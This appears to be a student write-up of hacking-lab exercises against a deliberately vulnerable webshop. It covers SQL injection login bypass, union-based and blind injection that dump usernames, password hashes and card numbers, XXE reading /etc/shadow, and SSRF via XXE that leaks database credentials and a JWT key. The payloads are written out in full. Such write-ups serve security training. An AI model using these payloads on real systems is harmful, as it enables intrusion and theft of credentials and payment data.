# SCHOGGI: SQL Injection on Login Form

- watched Request and Response of the login page for arbitrary logins via Burp Proxy
- we assume that the login query would look something like this:

```sql
SELECT 1 FROM user WHERE username='___' AND password='___';
```

- we tried the `'OR ''=''` separately/together in the username and password field and to exploit a known vulnerability. The responses where either invalid or we got an 500 error

```sql
SELECT 1 FROM user WHERE username='' OR ''='' AND password=''OR ''='';
```

- we tried the `' OR 1=1--[SPACE]` in the username field and the login was successful. We assume because the OR clause is always TRUE and the rest of the WHERE clause is ignored because of comment, we got the first row of the query result.

```sql
SELECT 1 FROM user WHERE username='' OR 1=1--
```

```json
{ "cart": [], "role": "user", "username": "alice" }
```

- now with this knowledge we tried the LIMIT function where we tried to get a specific row. The `LIMIT 4,1` was the first time a admin was returned.

```sql
SELECT 1 FROM user WHERE username=''OR 1=1 LIMIT 4,1--[SPACE]
```

```json
{ "cart": [], "role": "admin", "username": "victor" }
```

# SCHOGGI: Union-Based SQL Injection

- watched Request and Response of the search for arbitrary names via Burp Proxy

> Request

```json
{ "search": "name" }
```

> Response

```json
[{ "description": "...", "img": "...", "name": "...", "pid": 1, "price": 1 }, ...]
```

- tried to inject SQL commands as the value of `search`
- first we tried the `' OR 1=1--[SPACE]` to see if we get an error or a valid response -> the query was executed correctly

```json
{ "search": "' OR 1=1-- " }
```

- based on that we tried to use the `UNION SELECT` to get the entries of `user` or `users`
- based on the response of normal request we know that we get **5** fields
- tried different variants

```json
{ "search": "-' UNION SELECT 1,2,3,4,5 FROM users-- " }
```

```json
[{ "description": "3", "img": "5", "name": "2", "pid": 1, "price": 4 }]
```

- after that we tried to get general DB and table infos

```json
{
  "search": "-' UNION SELECT 1,schema_name,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA-- "
}
```

```json
{
  "search": "-' UNION SELECT 1,table_name,3,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'webshop'-- "
}
```

```json
{
  "search": "-' UNION SELECT 1,column_name,3,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users'-- "
}
```

- after that we knew the column names and searched for the specific ones

```json
{
  "search": "-' UNION SELECT 1,username,password_hash,credit_card,5 FROM users-- "
}
```

- and for the user `charlie`

```json
{
  "search": "-' UNION SELECT 1,username,password_hash,credit_card,5 FROM users WHERE username='charlie'-- "
}
```

```json
[
  {
    "description": "5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae",
    "img": "5",
    "name": "charlie",
    "pid": 1,
    "price": "2028 4889 0003 9887"
  }
]
```

# SCHOGGI: Blind SQL Injection (SQLI)

- based on the given hints tried to start the attack with the number **2**
- we used the `LIKE` operator to check for the credit card number and used the `%` as the wildcard

```json
{
  "username": "alice' AND (SELECT 1 FROM users WHERE username='mallory' AND credit_card LIKE '2%')-- ",
  "password": ""
}
```

- we tried this for the next 3 digits

> credit_card = 2025%

# SCHOGGI: XML External Entity (XXE)

- based on the sample XML file from the webpage and the presentation slides we used this XML file for the attack

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
<!ENTITY attack SYSTEM "file://localhost/etc/shadow">
]>
<order>
    <product>
        <name>&attack;</name>
        <quantity>1</quantity>
    </product>
</order>
```

- the shadow file was then visible on the webpage

# SCHOGGI: Server-Side Request Forgery (SSRF) with XXE

- used the hints and the given word list text file from the hacking lab and executed the gobuster

```sh
gobuster dir -e -u https://206666d1-46b9-4d85-a020-eb161812cce8.idocker.vuln.land -w /home/hacker/wordlist.txt
```

- the result of gobuster was that the endpoints `/admin` and `/profile` were found and exposed
- the endpoint `/debug` was also found but is not exposed resp. can only be accessed via the internal network

```sh
https://206666d1-46b9-4d85-a020-eb161812cce8.idocker.vuln.land/admin                (Status: 200) [Size: 656]
https://206666d1-46b9-4d85-a020-eb161812cce8.idocker.vuln.land/debug                (Status: 403) [Size: 48]
https://206666d1-46b9-4d85-a020-eb161812cce8.idocker.vuln.land/profile              (Status: 200) [Size: 656]
```

- based on that we setup the attack XML file and tried some variants until we got the debug file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
<!ENTITY attack SYSTEM "http://localhost:8888/debug">
]>
<order>
    <product>
        <name>&attack;</name>
        <quantity>1</quantity>
    </product>
</order>
```

```sh
[DEBUG] MYSQL_USER: db_user 2023-10-01 16:09:25
[DEBUG] MYSQL_PASSWORD: db_user 2023-10-01 16:09:25
[DEBUG] MYSQL_DATABASE: webshop 2023-10-01 16:09:25
[DEBUG] JWT Signing Key: 096fc22a64537d99303f4805dfc636babe9979cca1d9a175f21b5b9c240637b1
```
